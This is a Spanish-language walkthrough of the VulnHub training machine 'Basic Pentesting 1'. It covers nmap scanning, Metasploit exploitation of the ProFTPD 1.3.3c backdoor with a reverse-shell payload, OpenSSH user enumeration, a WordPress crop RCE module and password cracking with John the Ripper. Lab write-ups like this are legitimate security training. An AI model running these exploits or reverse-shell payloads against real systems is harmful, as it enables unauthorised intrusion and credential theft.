# Máquina vulnerable de vulnhub
Dificultad: 
  Fácil

Fuente:
  https://www.vulnhub.com/entry/basic-pentesting-1,216/

<img src="https://www.vulnhub.com/media/img/entry/watermarked/abee4bba0a38da507a6e8697537f04af9dfa63a6.png" align="top" width="640" height="480"></img>

# Explotación de la máquina
Averiguramos la ip de la máquina a explotar
nmap -sL 192.168.56.0/24<br>
Nmap scan report for vtcsec (192.168.56.103)<p>
<img src="https://github.com/aguayro/ciberseguridad/blob/a745f89a3fc90a98d3a4f07b21de74ac652dc09a/pentesting/vulnhub/csec/img/nmap-01.png" align="top"></img>

Descubrir los puertos abiertos en la máquina<br>
nmap -p- -n -sC -sV -sS 192.168.56.103 -oN csec.txt<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/9d7277331e01053a7b9794343b4afd07f7897f5a/pentesting/vulnhub/csec/img/nmap-02.png" align="top"></img>

Resulta interesante el parametro -vvv del nmap<br>
nmap -vvv 192.168.56.103<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/53901a26143a93b583d1ade1f88935691a55f379/pentesting/vulnhub/csec/img/nmap-03.png" align="top"></img>

## Explotación de las vulnerabilidades
La máquina tiene abiertos los siguientes puertos:
<ul>
  <li>21 ftp ProFTPD 1.3.3c</li>
  <li>22 ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</li>
  <li>80 http Apache/2.4.18 (Ubuntu)</li>
</ul>
    
<p></p>
Veamos que vulnerabilidades tiene los servicios indicados:<br>
nmap -script=vuln 192.168.56.103<br>

<img src="https://github.com/aguayro/ciberseguridad/blob/90586e32fd3113ce47e72e032c3452ac827ea62c/pentesting/vulnhub/csec/img/nmap-04.png" align="top"></img>  

### Servicio proftp 1.3.3c
La versión del proftp 1.3.3c tiene una puerta trasera que puede ser explotada<br>
    
searchsploit proftp 1.3.3c
<img src="https://github.com/aguayro/ciberseguridad/blob/b3316b172c48a3a956056b56326f179c04370e7d/pentesting/vulnhub/csec/img/proftp-01.png" align="top"></img> 

Tenemos dos script para poder usar para explotar la vulnerabilidad del servicio de puerta trasera, un script realizado en python y el otro para el framework metasploit
  
### Open ssh 7.2p2
Nmap no detecta ninguna vulnerabilidad en el servicio, pero si buscamos por searchsploit nos devuelve algunas cositas.
<img src="https://github.com/aguayro/ciberseguridad/blob/b13203f5b3d251772fd995fc7967ec690883c828/pentesting/vulnhub/csec/img/open-ssh-01.png" align="top"></img> 

Es posible realizar enumeración de los usuarios, por otro lado buscando en internet nos aparecen varias referencias a vulnerabilidad en versiones anteriores 

<a href="https://thehackernews.com/2023/07/new-openssh-vulnerability-exposes-linux.html">Vulnerabilidad openssh < 9.2</a>

### Apache httpd 2.4.18
Nmap nos reportado vulnerable a ataque DOS, buscamos información sobre posibles fallos en la versión de apache 2.4.18 y encontramos lo siguiente:<br>

searchsploit apache 2.4.18
<img src="https://github.com/aguayro/ciberseguridad/blob/96659ac542e55b25fa49831a77b3881da6f26b60/pentesting/vulnhub/csec/img/apache-01.png" align="top"></img> 

Vulnerabilidad de apache que permite la escalación de privilegios: CVE-2019-0211<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/841df8e72fdfcb8f6714df3ae4d7d29437f65a6a/pentesting/vulnhub/csec/img/apache-02.png" align="top"></img> 

Vulnerabilidad de memory leak: CVE-2017-9798<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/aa60a0c51dd73f839bc34c3d3c09817d829f5e8d/pentesting/vulnhub/csec/img/apache-03.png" align="top"></img> 

Por otro lado hay que investigar que se esconde dentro de la carpeta /secret

<hr>

# Vectores de ataque:
## Vulnerabilidad proftp 1.3.3c
Ejecutamos metasploit<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/ae116da2525d422aff0965f39b89ef32cff38a60/pentesting/vulnhub/csec/img/metasploit.png" align="top"></img> 

Buscamos vulnetabilidad para el servicio ftp para la versión de 1.3.3c de proftp<br>
msf6 > search proftp 1.3.3c
<img src="https://github.com/aguayro/ciberseguridad/blob/40d937f0b8672e179afb9c60320a9e1b2989c72b/pentesting/vulnhub/csec/img/proftp-02.png" align="top"></img> 

Usamos el script por defecto y lo configuramos<br>
msf6 > use 0<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/93177fa15813fc3257205e9c834a488095959599/pentesting/vulnhub/csec/img/proftp-03.png" align="top"></img> 

Cargamos un payload para que nos crea una sessión en la máquina atacada
msf6 > show payloads<br>
msf6 > set payload payload/cmd/unix/reverse<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/e9911ef860e7613d0b3da81e09fdb1e9094b0099/pentesting/vulnhub/csec/img/proftp-04.png" align="top"></img> 

Lanzamos el script
msf6 > run<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/cc1095ed762cb9e1fd78bb73e2567a255be7ace0/pentesting/vulnhub/csec/img/proftp-05.png"  align="top"></img> 

Nos devuelve un error indicando que falta por configurar la dirección ip desde donde se lanza el ataque para el reverse shell, configuramos lo que nos falta y volvemos a lanzar el script.<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/24178c71f4341e9de2afd16f14336ddfc4076de7/pentesting/vulnhub/csec/img/proftp-06.png"  align="top"></img> 

El script funciona correctamente y nos devuelve una shell, comprobamos que somos root en la máquina csec.<br>

Descargamos el fichero de claves para crackearlo con johh the ripper<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/f1bae791f185d5963026a151379df0ecdd7308f4/pentesting/vulnhub/csec/img/proftp-09.png"  align="top"></img> 

<p>
Usuario: marlinspike<br>
Contraseña: marlinspike
</p>

## Vulnerabilidad openssh 7.2p2
Realizando una búsquedad en searchsploit encontramos varias vulnerabilidades de enumeración de usuarios del servicio openssh 7.2p2 que produce un desbordamiento de buffer.

<img src="https://github.com/aguayro/ciberseguridad/blob/38a03cc3cb97bc020d9c268810af5bb7a6e4690d/pentesting/vulnhub/csec/img/open-ssh-02.png"  align="top"></img> 

Comprobamos el script en python 40136<br>
python /usr/share/exploitdb/exploits/linux/remote/40136.py -e -u marlinspike 192.168.56.103
<img src="https://github.com/aguayro/ciberseguridad/blob/a1cac0cc1738057621d2735bc7f45962fccebdbe/pentesting/vulnhub/csec/img/openssh-03.png"  align="top"></img> 

<a href="https://blog.nviso.eu/2018/08/21/openssh-user-enumeration-vulnerability-a-close-look">Explicación vulnerabilidad openssh</a>

## Vulnerabilidad Apache 2.4.18
En el servidor apache tenemos varios vectores de ataque, como hemos visto anteriormente.<br>
Comprobamos la versión de apache que nos ha devuelto nmap con el comando whatweb.<br>
whatweb 192.168.56.103<br>

<img src="https://github.com/aguayro/ciberseguridad/blob/9634d094f8d9355df2582ec93f95f318163e63a1/pentesting/vulnhub/csec/img/apache-04.png" align="top"></img> 

Accedemos a la web para comprobar su contenido<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/48d9bd19f8ac13c1695f24c82f1446336a1824f6/pentesting/vulnhub/csec/img/apache-05.png" align="top"></img>

No nos muestra gran cosa, sólo la página por defecto del servidor apache. Investigamos si hay otros directorios servidor con la ayuda de gobuster o dirb<br>
gobuster dir -u 192.168.56.103 -e -w /usr/share/wordlists/dirb/common.txt<br>

<img src="https://github.com/aguayro/ciberseguridad/blob/58afd99a4e6df8e8f0b34e4587a584314ac6616c/pentesting/vulnhub/csec/img/apache-06.png" align="top"></img><br>
Parece que hemos descubierto un directorio oculto en el servidor apache, vamos a ver lo que hay dentro.<br>

<img src="https://github.com/aguayro/ciberseguridad/blob/80d1ae24e03fa84c46f1cc41c6e086380ad25b26/pentesting/vulnhub/csec/img/apache-07.png" align="top"></img><br>
Tenemos un blog en wordpress, veamos si podemos averiguar los usuarios y contraseñas que hay definidas en el portal. Posteriormente buscaremos vulnerabilidades en el wordpress y sus plugins.<br>

wpscan –url http://192.168.56.103/secret –-enumerate u<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/c09af268905fdaeeea5aab43aacb4f944b5bf689/pentesting/vulnhub/csec/img/apache-10.png"  align="top"></img>
<br>Hemos encontrado el usuario admin en la web de wordpress, veamos si podemos averiguar su contraseña con el script CMSeek<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/4468531fe910c05c6f910570654f092b803ca7a6/pentesting/vulnhub/csec/img/wordpress-01.png" align="top"></img>

Realizamos un scaneo de plugins con el script CMSeek<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/6a62e200171ead3fd9cacf2c465a3a162603bdf5/pentesting/vulnhub/csec/img/wordpress-02.png" align="top"></img><br>
Los resultado no desvelan mucha información, por lo que usamos el script wpscan que nos devuelve mucha más información con la que poder buscar vulnerabilidades en los plugins y temas de wordpress.<br>

wpscan --url http://192.168.56.103/secret --wp-content-dir /wp-content/ --enumerate u --plugins-detection aggressive<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/147454d014af7d5cd45e6d805a72fc8c4e2f42d2/pentesting/vulnhub/csec/img/apache-08.png" align="top"></img>

Nos identifica varias incidencias que tenemos que chequear en búsquedad de otros vectores de ataque:
###  XML-RPC 
<img src="https://github.com/aguayro/ciberseguridad/blob/86e89540c43efd0a821ccd260fbd7ab278cac69a/pentesting/vulnhub/csec/img/wordpress-03.png" align="top"></img>

Buscamos un exploit para xml-rpc de wordpress en metasploit y lo configuramos<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/19a109b84e1969712a8cbc40ccc2d0c83bba9c03/pentesting/vulnhub/csec/img/wordpress-09.png" align="top"></img><br>

Nos devuelve un error al procesar el payload, no consigo solucionar el problema de este exploit.<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/8d6158bac8a8a13cce143e8bc29a33de2f59a114/pentesting/vulnhub/csec/img/wordpress-10.png" align="top"></img><br>

### WordPress readme found:
<img src="https://github.com/aguayro/ciberseguridad/blob/4daa3bd5b08bc4116c781f64eb74d0eb89ec09d6/pentesting/vulnhub/csec/img/wordpress-04.png" align="top"></img>

### Upload directory has listing enabled:
<img src="https://github.com/aguayro/ciberseguridad/blob/4daa3bd5b08bc4116c781f64eb74d0eb89ec09d6/pentesting/vulnhub/csec/img/wordpress-05.png" align="top"></img> 

### the external WP-Cron seems to be enabled
<img src="https://github.com/aguayro/ciberseguridad/blob/4daa3bd5b08bc4116c781f64eb74d0eb89ec09d6/pentesting/vulnhub/csec/img/wordpress-06.png" align="top"></img>  

### WordPress version 4.9
<img src="https://github.com/aguayro/ciberseguridad/blob/c88f8bf6e1d336c59d3c4044557b6edd9641d8a8/pentesting/vulnhub/csec/img/wordpress-08.png" align="top"></img>  

Recurrimos al metasploit para buscar un exploit para atacar la versión de wordpress 4.9, encontramos<br>
msf6 exploit(multi/http/wp_crop_rce) ><br>

Información sobre el exploit 
<img src="https://github.com/aguayro/ciberseguridad/blob/40d7b17ac6208bad9e945c104d15f96538cec0e5/pentesting/vulnhub/csec/img/wordpress-17.png" align="top"></img><br> 

<img src="https://github.com/aguayro/ciberseguridad/blob/24a3a9f2dbc3726b03bc489f938ade4d2b1e8c5b/pentesting/vulnhub/csec/img/wordpress-11.png" align="top"></img><br>

Configuramos el exploit y lo lanzamos<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/24a3a9f2dbc3726b03bc489f938ade4d2b1e8c5b/pentesting/vulnhub/csec/img/wordpress-12.png" align="top"></img><br>
<img src="https://github.com/aguayro/ciberseguridad/blob/7c6ff9415ea0eb166e0774dde39cdd313370b830/pentesting/vulnhub/csec/img/wordpress-13.png" align="top"></img><br>

Lanzamo un shell para verificar que usuario somos, estamos como www-data<br>
<img src="https://github.com/aguayro/ciberseguridad/blob/7c6ff9415ea0eb166e0774dde39cdd313370b830/pentesting/vulnhub/csec/img/wordpress-14.png" align="top"></img><br>

Descargamos el fichero de claves y lo pasamos por nuestro amigo john the ripper
<img src="https://github.com/aguayro/ciberseguridad/blob/560f5f6fcc4940ad4ae2ed88529334f94b6088b4/pentesting/vulnhub/csec/img/wordpress-15.png" align="top"></img><br>

<img src="https://github.com/aguayro/ciberseguridad/blob/560f5f6fcc4940ad4ae2ed88529334f94b6088b4/pentesting/vulnhub/csec/img/wordpress-16.png" align="top"></img><br>

### Ataque DOS

  
  

  
